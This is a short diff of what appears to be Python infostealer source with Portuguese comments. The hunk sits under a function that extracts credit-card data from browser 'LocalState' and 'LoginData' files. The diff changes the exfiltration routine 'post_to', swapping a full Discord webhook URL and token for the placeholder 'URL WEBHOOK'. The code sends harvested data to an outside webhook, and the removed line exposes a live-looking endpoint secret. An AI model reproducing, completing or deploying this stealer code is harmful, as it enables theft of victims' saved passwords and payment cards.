@@ -281,7 +281,7 @@ def extrair_cartao_credito(LocalState, LoginData):
 
 # Função para enviar dados ao webhook
 def post_to(file_content):
-    webhook_url = "https://discord.com/api/webhooks/1297124477619929128/Cpwsm_eMejpRocoQl733lmKoqtNQBdSNnAtL5XjsxXg6At-EbveXbPXsrXEwTP23YzLO"  # URL do webhook do Discord
+    webhook_url = "URL WEBHOOK"  # URL do webhook do Discord
 
     # Enviar para Webhook do Discord
     try:
